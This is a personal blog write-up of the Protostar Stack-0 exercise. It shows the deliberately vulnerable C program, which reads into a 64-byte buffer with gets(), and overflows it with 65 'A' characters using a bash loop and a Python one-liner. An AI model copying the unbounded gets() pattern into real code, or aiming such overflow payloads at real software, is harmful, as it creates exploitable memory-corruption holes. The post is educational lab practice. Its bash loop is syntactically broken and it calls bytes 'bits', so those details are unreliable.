---
author: "faizul"
title: "Protostar Stack-00"
date: 2020-09-30T12:00:06+09:00
description: "Exploit-Exercise Protostar Stack-0"
draft: false
hideToc: false
enableToc: true
enableTocContent: false
image: images/protostar/protostar.jpeg
tags: 
- reverse-engineering
- protostar
- exploit-exercise
- buffer-overflow
categories:
- writeup
- reverse-engineering
- buffer-overflow
---
 
Low-level exploit, reverse engineering always excite me. Eventhough i did attended one class during Bachelor Degree and learn about Assembly in X86, i only admire this skillset when i relly grind myslef into cybersec and pentest. I try to attend few free training during DefCon and other InfoSec Conference besides doing tutorial from various blog such as MalwareUnicorn, netgarageio and the Exploit Exercise itself. 

This post will be the first entry of me doing Protostar VM by exploit-exercise. While the Stack-0 will be easiest form of Buffer Overflow(for entry), this VM might help me to prepare my aim to gain OSCP in 2021. Enjoy my dumb writing. 

## Problem
This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

This level is at /opt/protostar/bin/stack0

## Code provided

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```
## Binary execution
![4052c843babad3a3f3a121fa05eaf88f.png](/images/protostar/f6f2ffd342c546f686de2632a76ac35a.png)

## Solution 
Since the code show how `char buffer` only hold `[64]` bit value, lets run this first with 3 bit value. Next, we going to run the binary with value up to 64. To do this, we can use bash script to generate/print value 64 above.



```bash
user@protostar:~$ for a in {1..65}; echo -n a; done

aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

you have changed the 'modified' variable
```

Ok, looks like we successfully overwrite the memory area by exploiting the memory buffer overflow technique. 

To make the payload in a form of human readable and beautiful, lets just use python. 

```python
python -c "print 'A' * 65" | /opt/protostar/bin/stack0
```

